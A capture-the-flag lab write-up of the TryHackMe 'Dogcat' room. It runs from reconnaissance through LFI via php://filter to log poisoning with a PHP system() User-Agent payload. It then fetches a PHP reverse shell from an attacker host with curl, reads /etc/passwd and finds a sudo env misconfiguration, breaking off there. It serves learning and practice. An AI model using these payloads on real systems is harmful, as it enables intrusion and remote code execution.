# Dogcat

URL: https://tryhackme.com/room/dogcat

Level: Medium

Date: 8 Aug 2023

- [Reconnaissance](#reconnaissance)
	- [NMAP](#nmap)
	- [Web](#web)
	- [LFI](#lfi)
	
- [Flag 1](#flag-1)
- [Flag 2](#flag-2)
- [Flag 3](#flag-3)
- [Flag 4](#flag-4)





## Reconnaissance

### nmap

```bash
# Nmap 7.93 scan initiated Tue Aug  8 19:24:58 2023 as: nmap -T4 -p- -n -oA nmap 10.10.155.166
Nmap scan report for 10.10.155.166
Host is up (0.074s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

# Nmap done at Tue Aug  8 19:27:27 2023 -- 1 IP address (1 host up) scanned in 148.35 seconds
```

```bash
joshua@kaligra:~/Documents/thm/dogcat$ sudo nmap -T4 -p80 -n 10.10.155.166 -sC -sV -oA nmap2
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-08 19:29 CEST
Nmap scan report for 10.10.155.166
Host is up (0.056s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: dogcat
|_http-server-header: Apache/2.4.38 (Debian)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.25 seconds
```


### web

```bash
joshua@kaligra:~/Documents/thm/dogcat$ curl -I -v 10.10.155.166
*   Trying 10.10.155.166:80...
* Connected to 10.10.155.166 (10.10.155.166) port 80 (#0)
> HEAD / HTTP/1.1
> Host: 10.10.155.166
> User-Agent: curl/7.87.0
> Accept: */*
>
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
HTTP/1.1 200 OK
< Date: Tue, 08 Aug 2023 17:30:47 GMT
Date: Tue, 08 Aug 2023 17:30:47 GMT
< Server: Apache/2.4.38 (Debian)
Server: Apache/2.4.38 (Debian)
< X-Powered-By: PHP/7.4.3
X-Powered-By: PHP/7.4.3
< Content-Type: text/html; charset=UTF-8
Content-Type: text/html; charset=UTF-8

<
* Connection #0 to host 10.10.155.166 left intact
```

![](Pasted%20image%2020230808192735.png)

`?view=dog`

![](Pasted%20image%2020230808192801.png)

`?view=cat`

![](Pasted%20image%2020230808192824.png)


HTML source

```html
<!DOCTYPE HTML>
<html>

<head>
    <title>dogcat</title>
    <link rel="stylesheet" type="text/css" href="[/style.css](view-source:http://10.10.155.166/style.css)">
</head>

<body>
    <h1>dogcat</h1>
    <i>a gallery of various dogs or cats</i>

    <div>
        <h2>What would you like to see?</h2>
        <a href="[/?view=dog](view-source:http://10.10.155.166/?view=dog)"><button id="dog">A dog</button></a> <a href="[/?view=cat](view-source:http://10.10.155.166/?view=cat)"><button id="cat">A cat</button></a><br>
        Here you go!<img src="[cats/10.jpg](view-source:http://10.10.155.166/cats/10.jpg)" />
    </div>
</body>

</html>
```

A simple try:

`http://10.10.155.166/?view=/etc/passwd`

![](Pasted%20image%2020230808193152.png)

Dirbusting

```bash
joshua@kaligra:~/Documents/thm/dogcat$ feroxbuster --silent -u  http://10.10.155.166 -t 200 -L 1  -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
http://10.10.155.166/
http://10.10.155.166/cats => http://10.10.155.166/cats/
http://10.10.155.166/dogs => http://10.10.155.166/dogs/
http://10.10.155.166/server-status
```

Let's download all (?) dogs & cats:

```bash
joshua@kaligra:~/Documents/thm/dogcat$ mkdir dogs
joshua@kaligra:~/Documents/thm/dogcat$ cd dogs/
joshua@kaligra:~/Documents/thm/dogcat/dogs$ for i in $(seq 1 10); do curl http://10.10.143.39/dogs/$i.jpg -o $i.jpg; done
```

Nothing about steganography, hopefully :)

```bash
joshua@kaligra:~/Documents/thm/dogcat/cats$ for i in $(ls); do stegseek $i; done
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Progress: 99.95% (133.4 MB)
[!] error: Could not find a valid passphrase.
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Progress: 99.98% (133.4 MB)
[!] error: Could not find a valid passphrase.
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Progress: 99.89% (133.3 MB)
[!] error: Could not find a valid passphrase.
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Progress: 99.95% (133.4 MB)
[!] error: Could not find a valid passphrase.
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Progress: 99.87% (133.3 MB)
[!] error: Could not find a valid passphrase.
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Progress: 99.95% (133.4 MB)
[!] error: Could not find a valid passphrase.
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Progress: 99.98% (133.4 MB)
[!] error: Could not find a valid passphrase.
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Progress: 99.97% (133.4 MB)
[!] error: Could not find a valid passphrase.
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Progress: 99.89% (133.3 MB)
[!] error: Could not find a valid passphrase.
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Progress: 99.89% (133.3 MB)
[!] error: Could not find a valid passphrase.
```


### LFI

Let's try some payload to get Local File Inclusion.

```bash
$ wfuzz -c -w ./file_inclusion_linux.txt --hw 0 http://10.10.178.223/?view=FUZZ
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.178.223/?view=FUZZ
Total requests: 2292

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000001:   200        19 L     44 W       455 Ch      "%00../../../../../../etc/passwd"
000000011:   200        19 L     44 W       455 Ch      "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252
                                                        e%252e%252f%252e%252e%252fetc/shadow"
000000004:   200        19 L     44 W       455 Ch      "%00/etc/shadow%00"
000000010:   200        19 L     44 W       455 Ch      "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252
                                                        e%252e%252f%252e%252e%252fetc/passwd"
000000005:   200        25 L     78 W       785 Ch      "%0a/bin/cat%20/etc/passwd"
000000006:   200        25 L     78 W       785 Ch      "%0a/bin/cat%20/etc/shadow"
..
..
..
```

We notice that every request seems to get `200` response.

In fact:

```bash
$ curl http://10.10.178.223/?view=/opt/apache2/apache2.conf
<!DOCTYPE HTML>
<html>

<head>
    <title>dogcat</title>
    <link rel="stylesheet" type="text/css" href="/style.css">
</head>

<body>
    <h1>dogcat</h1>
    <i>a gallery of various dogs or cats</i>

    <div>
        <h2>What would you like to see?</h2>
        <a href="/?view=dog"><button id="dog">A dog</button></a> <a href="/?view=cat"><button id="cat">A cat</button></a><br>
        Sorry, only dogs or cats are allowed.    </div>
</body>
</html>
```

We also notice that if we can put `cats` or `dogs`, this is working!

```bash
$ curl http://10.10.178.223/?view=cats/opt/apache2/apache2.conf
<!DOCTYPE HTML>
<html>

<head>
    <title>dogcat</title>
    <link rel="stylesheet" type="text/css" href="/style.css">
</head>

<body>
    <h1>dogcat</h1>
    <i>a gallery of various dogs or cats</i>

    <div>
        <h2>What would you like to see?</h2>
        <a href="/?view=dog"><button id="dog">A dog</button></a> <a href="/?view=cat"><button id="cat">A cat</button></a><br>
        Here you go!<br />
<b>Warning</b>:  include(cats/opt/apache2/apache2.conf.php): failed to open stream: No such file or directory in <b>/var/www/html/index.php</b> on line <b>24</b><br />
<br />
<b>Warning</b>:  include(): Failed opening 'cats/opt/apache2/apache2.conf.php' for inclusion (include_path='.:/usr/local/lib/php') in <b>/var/www/html/index.php</b> on line <b>24</b><br />
    </div>
</body>
</html>
```

It looks like `allow_url_include` is off:

```bash
$ curl http://10.10.178.223/?view=http://10.8.100.14/cats
<!DOCTYPE HTML>
<html>

<head>
    <title>dogcat</title>
    <link rel="stylesheet" type="text/css" href="/style.css">
</head>

<body>
    <h1>dogcat</h1>
    <i>a gallery of various dogs or cats</i>

    <div>
        <h2>What would you like to see?</h2>
        <a href="/?view=dog"><button id="dog">A dog</button></a> <a href="/?view=cat"><button id="cat">A cat</button></a><br>
        Here you go!<br />
<b>Warning</b>:  include(): http:// wrapper is disabled in the server configuration by allow_url_include=0 in <b>/var/www/html/index.php</b> on line <b>24</b><br />
<br />
<b>Warning</b>:  include(http://10.8.100.14/cats.php): failed to open stream: no suitable wrapper could be found in <b>/var/www/html/index.php</b> on line <b>24</b><br />
<br />
<b>Warning</b>:  include(): Failed opening 'http://10.8.100.14/cats.php' for inclusion (include_path='.:/usr/local/lib/php') in <b>/var/www/html/index.php</b> on line <b>24</b><br />
    </div>
</body>
</html>
```

Let's try to enumerate further for specific extensions (`.php`, `.txt`, `.html`):

```bash
$ gobuster dir -u  http://10.10.178.223  -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.178.223
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Extensions:              php,txt,html
[+] Timeout:                 10s
===============================================================
2023/08/10 09:46:05 Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 278]
/index.php            (Status: 200) [Size: 418]
/cat.php              (Status: 200) [Size: 26]
/flag.php             (Status: 200) [Size: 0]
..
..
```

Let's try to include `flag.php` someway

```bash
$ curl http://10.10.178.223/?view=cat/../flag.php
<!DOCTYPE HTML>
<html>

<head>
    <title>dogcat</title>
    <link rel="stylesheet" type="text/css" href="/style.css">
</head>

<body>
    <h1>dogcat</h1>
    <i>a gallery of various dogs or cats</i>

    <div>
        <h2>What would you like to see?</h2>
        <a href="/?view=dog"><button id="dog">A dog</button></a> <a href="/?view=cat"><button id="cat">A cat</button></a><br>
        Here you go!<br />
<b>Warning</b>:  include(cat/../flag.php.php): failed to open stream: No such file or directory in <b>/var/www/html/index.php</b> on line <b>24</b><br />
<br />
<b>Warning</b>:  include(): Failed opening 'cat/../flag.php.php' for inclusion (include_path='.:/usr/local/lib/php') in <b>/var/www/html/index.php</b> on line <b>24</b><br />
    </div>
</body>
</html>
```

"here you go!"

```bash
$ curl http://10.10.178.223/?view=cat/../flag
<!DOCTYPE HTML>
<html>

<head>
    <title>dogcat</title>
    <link rel="stylesheet" type="text/css" href="/style.css">
</head>

<body>
    <h1>dogcat</h1>
    <i>a gallery of various dogs or cats</i>

    <div>
        <h2>What would you like to see?</h2>
        <a href="/?view=dog"><button id="dog">A dog</button></a> <a href="/?view=cat"><button id="cat">A cat</button></a><br>
        Here you go!    </div>
</body>
</html>
```

THIS worked!

```bash
joshua@kaligra:/opt/tools/fimap$ curl http://10.10.178.223/?view=php://filter/read=convert.base64-encode/resource=cat/../flag
<!DOCTYPE HTML>
<html>

<head>
    <title>dogcat</title>
    <link rel="stylesheet" type="text/css" href="/style.css">
</head>

<body>
    <h1>dogcat</h1>
    <i>a gallery of various dogs or cats</i>

    <div>
        <h2>What would you like to see?</h2>
        <a href="/?view=dog"><button id="dog">A dog</button></a> <a href="/?view=cat"><button id="cat">A cat</button></a><br>
        Here you go!PD9waHAKJGZsYWdfMSA9ICJUSE17VGgxc18xc19OMHRfNF9DYXRkb2dfYWI2N2VkZmF9Igo/Pgo=    </div>
</body>

</html>

```

## flag 1

```bash
joshua@kaligra:/opt/tools/fimap$ echo -n "PD9waHAKJGZsYWdfMSA9ICJUSE17VGgxc18xc19OMHRfNF9DYXRkb2dfYWI2N2VkZmF9Igo/Pgo=" | base64 -d
<?php
$flag_1 = "THM{Th1s_1s_N0t_4_xxxxxxxx}"
?>
```


## flag 2

Since we are able to include PHP files, let's try to show `index.php`'s content:

`$ curl http://10.10.178.223/?view=php://filter/read=convert.base64-encode/resource=cat/../index`

```bash
$ echo -n "PCFET0NUWVBFIEhUTUw+CjxodG1sPgoKPGhlYWQ+CiAgICA8dGl0bGU+ZG9nY2F0PC90aXRsZT4KICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgdHlwZT0idGV4dC9jc3MiIGhyZWY9Ii9zdHlsZS5jc3MiPgo8L2hlYWQ+Cgo8Ym9keT4KICAgIDxoMT5kb2djYXQ8L2gxPgogICAgPGk+YSBnYWxsZXJ5IG9mIHZhcmlvdXMgZG9ncyBvciBjYXRzPC9pPgoKICAgIDxkaXY+CiAgICAgICAgPGgyPldoYXQgd291bGQgeW91IGxpa2UgdG8gc2VlPzwvaDI+CiAgICAgICAgPGEgaHJlZj0iLz92aWV3PWRvZyI+PGJ1dHRvbiBpZD0iZG9nIj5BIGRvZzwvYnV0dG9uPjwvYT4gPGEgaHJlZj0iLz92aWV3PWNhdCI+PGJ1dHRvbiBpZD0iY2F0Ij5BIGNhdDwvYnV0dG9uPjwvYT48YnI+CiAgICAgICAgPD9waHAKICAgICAgICAgICAgZnVuY3Rpb24gY29udGFpbnNTdHIoJHN0ciwgJHN1YnN0cikgewogICAgICAgICAgICAgICAgcmV0dXJuIHN0cnBvcygkc3RyLCAkc3Vic3RyKSAhPT0gZmFsc2U7CiAgICAgICAgICAgIH0KCSAgICAkZXh0ID0gaXNzZXQoJF9HRVRbImV4dCJdKSA/ICRfR0VUWyJleHQiXSA6ICcucGhwJzsKICAgICAgICAgICAgaWYoaXNzZXQoJF9HRVRbJ3ZpZXcnXSkpIHsKICAgICAgICAgICAgICAgIGlmKGNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICdkb2cnKSB8fCBjb250YWluc1N0cigkX0dFVFsndmlldyddLCAnY2F0JykpIHsKICAgICAgICAgICAgICAgICAgICBlY2hvICdIZXJlIHlvdSBnbyEnOwogICAgICAgICAgICAgICAgICAgIGluY2x1ZGUgJF9HRVRbJ3ZpZXcnXSAuICRleHQ7CiAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgIGVjaG8gJ1NvcnJ5LCBvbmx5IGRvZ3Mgb3IgY2F0cyBhcmUgYWxsb3dlZC4nOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgPz4KICAgIDwvZGl2Pgo8L2JvZHk+Cgo8L2h0bWw+Cg==" | base64 -d
<!DOCTYPE HTML>
<html>

<head>
    <title>dogcat</title>
    <link rel="stylesheet" type="text/css" href="/style.css">
</head>

<body>
    <h1>dogcat</h1>
    <i>a gallery of various dogs or cats</i>

    <div>
        <h2>What would you like to see?</h2>
        <a href="/?view=dog"><button id="dog">A dog</button></a> <a href="/?view=cat"><button id="cat">A cat</button></a><br>
        <?php
            function containsStr($str, $substr) {
                return strpos($str, $substr) !== false;
            }
            $ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
            if(isset($_GET['view'])) {
                if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
                    echo 'Here you go!';
                    include $_GET['view'] . $ext;
                } else {
                    echo 'Sorry, only dogs or cats are allowed.';
                }
            }
        ?>
    </div>
</body>

</html>
```

It looks like the `$ext` variable is set through a `GET` parameter.

Let's try to set an empy `ext`:

```bash
$ curl "http://10.10.178.223/?ext=&view=php://filter/read=convert.base64-encode/resource=cat/../../../../../../../etc/passwd"
<!DOCTYPE HTML>
<html>

<head>
    <title>dogcat</title>
    <link rel="stylesheet" type="text/css" href="/style.css">
</head>

<body>
    <h1>dogcat</h1>
    <i>a gallery of various dogs or cats</i>

    <div>
        <h2>What would you like to see?</h2>
        <a href="/?view=dog"><button id="dog">A dog</button></a> <a href="/?view=cat"><button id="cat">A cat</button></a><br>
        Here you go!cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovdmFyL3J1bi9pcmNkOi91c3Ivc2Jpbi9ub2xvZ2luCmduYXRzOng6NDE6NDE6R25hdHMgQnVnLVJlcG9ydGluZyBTeXN0ZW0gKGFkbWluKTovdmFyL2xpYi9nbmF0czovdXNyL3NiaW4vbm9sb2dpbgpub2JvZHk6eDo2NTUzNDo2NTUzNDpub2JvZHk6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCl9hcHQ6eDoxMDA6NjU1MzQ6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgo=    </div>
</body>
</html>
```

```bash
$ echo -n "cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovdmFyL3J1bi9pcmNkOi91c3Ivc2Jpbi9ub2xvZ2luCmduYXRzOng6NDE6NDE6R25hdHMgQnVnLVJlcG9ydGluZyBTeXN0ZW0gKGFkbWluKTovdmFyL2xpYi9nbmF0czovdXNyL3NiaW4vbm9sb2dpbgpub2JvZHk6eDo2NTUzNDo2NTUzNDpub2JvZHk6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCl9hcHQ6eDoxMDA6NjU1MzQ6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgo=" | base64 -d
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
```


Apache conf:

```bash
curl "http://10.10.178.223/?ext=&view=php://filter/read=convert.base64-encode/resource=cat/../../../../../../../etc/apache2/apache2.conf"
<!DOCTYPE HTML>
<html>

<head>
    <title>dogcat</title>
    <link rel="stylesheet" type="text/css" href="/style.css">
</head>

<body>
    <h1>dogcat</h1>
    <i>a gallery of various dogs or cats</i>

    <div>
        <h2>What would you like to see?</h2>
        <a href="/?view=dog"><button id="dog">A dog</button></a> <a href="/?view=cat"><button id="cat">A cat</button></a><br>
        Here you go!IyBUaGlzIGlzIHRoZSBtYWluIEFwYWNoZSBzZXJ2ZXIgY29uZmlndXJhdGlvbiBmaWxlLiAgSXQgY29udGFpbnMgdGhlCiMgY29uZmlndXJhdGlvbiBkaXJlY3RpdmVzIHRoYXQgZ2l2ZSB0aGUgc2VydmVyIGl0cyBpbnN0cn
VjdGlvbnMuCiMgU2VlIGh0dHA6Ly9odHRwZC5hcGFjaGUub3JnL2RvY3MvMi40LyBmb3IgZGV0YWlsZWQgaW5mb3JtYXRpb24gYWJvdXQKIyB0aGUgZGlyZWN0aXZlcyBhbmQgL3Vzci9zaGFyZS9kb2MvYXBhY2hlMi9SRUFETUUuRGViaWFuIGFib3V0
IERlYmlhbiBzcGVjaWZpYwojIGhpbnRzLgojCiMKIyBTdW1tYXJ5IG9mIGhvdyB0aGUgQXBhY2hlIDIgY29uZmlndXJhdGlvbiB3b3JrcyBpbiBEZWJpYW46CiMgVGhlIEFwYWNoZSAyIHdlYiBzZXJ2ZXIgY29uZmlndXJhdGlvbiBpbiBEZWJpYW4gaX
MgcXVpdGUgZGlmZmVyZW50IHRvCiMgdXBzdHJlYW0ncyBzdWdnZXN0ZWQgd2F5IHRvIGNvbmZpZ3VyZSB0aGUgd2ViIHNlcnZlci4gVGhpcyBpcyBiZWNhdXNlIERlYmlhbidzCiMgZGVmYXVsdCBBcGFjaGUyIGluc3RhbGxhdGlvbiBhdHRlbXB0cyB0
byBtYWtlIGFkZGluZyBhbmQgcmVtb3ZpbmcgbW9kdWxlcywKIyB2aXJ0dWFsIGhvc3R
..
..
```

We can't open log files:


```bash
Allowed memory size of 134217728 bytes exhausted (tried to allocate 45327064 bytes) in <b>/var/log/apache2/access.log</b>
```

But of cours we can WRITE to log file.

Let's try to "poison" log file with a fake `User-Agent`:


```bash
 curl -A "<?php system($_GET['cmd']);?>" "http://10.10.178.223/?ext=&cmd=id&view=php://filter/read=convert.base64-encode/resource=cat/../../../../../../../var/log/apache2/access.log&cmd=id"
```

Since we get error "allow memory size exhausted", we revert machine so the `access.log` file is smaller.

We send this request with Burpsuite

```bash
GET /?ext=&view=cat/../../../../../../../var/log/apache2/access.log&cmd=whoami HTTP/1.1
Host: 10.10.189.56
User-Agent: <?php system($_GET['cmd']);?>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://10.10.189.56/?view=dog
Upgrade-Insecure-Requests: 1
```

And we get code execution:

```bash
10.8.100.14 - - [10/Aug/2023:09:09:16 +0000] "GET /?ext=&view=cat/../../../../../../../var/log/apache2/access.log&cmd=id HTTP/1.1" 200 828 "http://10.10.189.56/?view=dog" "www-data
"
127.0.0.1 - - [10/Aug/2023:09:09:18 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
    </div>
</body>
```

We have `cURL` on target:

```bash
GET /?ext=&view=cat/../../../../../../../var/log/apache2/access.log&cmd=which%20curl HTTP/1.1

Host: 10.10.189.56

User-Agent: <?php system($_GET['cmd']);?>
```

```bash
/?ext=&view=cat/../../../../../../../var/log/apache2/access.log&cmd=ls%20/tmp HTTP/1.1" 200 998 "http://10.10.189.56/?view=dog" "/usr/bin/curl
```

Let's try to download a malicious PHP reverse shell, hosted on our attacker machine:

```bash
joshua@kaligra:~/Documents/thm/dogcat$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Our payload

`curl%20http://10.8.100.14/shell.php%20-o%20shell.php`

We get a positive confirmation that file is there!

![](Pasted%20image%2020230810111911.png)


Spawn our netcat listener

```bash
joshua@kaligra:~/Documents/thm/dogcat$ nc -nvlp 4444
listening on [any] 4444 ...
```

We connect to... 

http://10.10.189.56/shell.php

and we get our reverse shell

```bash
Linux fa2c9c10cd2d 4.15.0-96-generic #97-Ubuntu SMP Wed Apr 1 03:25:46 UTC 2020 x86_64 GNU/Linux
 09:19:52 up 20 min,  0 users,  load average: 0.00, 0.12, 0.42
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$
```


Let's search for flag n. 2:

```bash
$ find / -type f -name "flag*" 2>/dev/null
/var/www/html/flag.php
/var/www/flag2_QMW7JvaY2LvK.txt
/sys/devices/pnp0/00:06/tty/ttyS0/flags
/sys/devices/platform/serial8250/tty/ttyS15/flags
/sys/devices/platform/serial8250/tty/ttyS6/flags
/sys/devices/platform/serial8250/tty/ttyS23/flags
/sys/devices/platform/serial8250/tty/ttyS13/flags
/sys/devices/platform/serial8250/tty/ttyS31/flags
/sys/devices/platform/serial8250/tty/ttyS4/flags
/sys/devices/platform/serial8250/tty/ttyS21/flags
/sys/devices/platform/serial8250/tty/ttyS11/flags
/sys/devices/platform/serial8250/tty/ttyS2/flags
/sys/devices/platform/serial8250/tty/ttyS28/flags
/sys/devices/platform/serial8250/tty/ttyS18/flags
/sys/devices/platform/serial8250/tty/ttyS9/flags
/sys/devices/platform/serial8250/tty/ttyS26/flags
/sys/devices/platform/serial8250/tty/ttyS16/flags
/sys/devices/platform/serial8250/tty/ttyS7/flags
/sys/devices/platform/serial8250/tty/ttyS24/flags
/sys/devices/platform/serial8250/tty/ttyS14/flags
/sys/devices/platform/serial8250/tty/ttyS5/flags
/sys/devices/platform/serial8250/tty/ttyS22/flags
/sys/devices/platform/serial8250/tty/ttyS12/flags
/sys/devices/platform/serial8250/tty/ttyS30/flags
/sys/devices/platform/serial8250/tty/ttyS3/flags
/sys/devices/platform/serial8250/tty/ttyS20/flags
/sys/devices/platform/serial8250/tty/ttyS10/flags
/sys/devices/platform/serial8250/tty/ttyS29/flags
/sys/devices/platform/serial8250/tty/ttyS1/flags
/sys/devices/platform/serial8250/tty/ttyS19/flags
/sys/devices/platform/serial8250/tty/ttyS27/flags
/sys/devices/platform/serial8250/tty/ttyS17/flags
/sys/devices/platform/serial8250/tty/ttyS8/flags
/sys/devices/platform/serial8250/tty/ttyS25/flags
/sys/devices/virtual/net/lo/flags
/sys/devices/virtual/net/eth0/flags
$
```

```bash
$ cat /var/www/flag2_QMW7JvaY2LvK.txt
THM{LF1_t0_xxxxxxx}
```


## flag 3


We transfer `linpeas.sh` to target machine, and we found some interesting:

```bash
╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
Matching Defaults entries for www-data on fa2c9c10cd2d:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on fa2c9c10cd2d:
    (root) NOPASSWD: /usr/bin/env
```

```bash
$ sudo /usr/bin/env
HOSTNAME=fa2c9c10cd2d
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
LANG=C
MAIL=/var/mail/root
LOGNAME=root
USER=root
HOME=/root
SHELL=/bin/bash
TERM=unknown
SUDO_COMMAND=/usr/bin/env
SUDO_USER=www-data
SUDO_UID=33
SUDO_GID=33
$
```

```bash
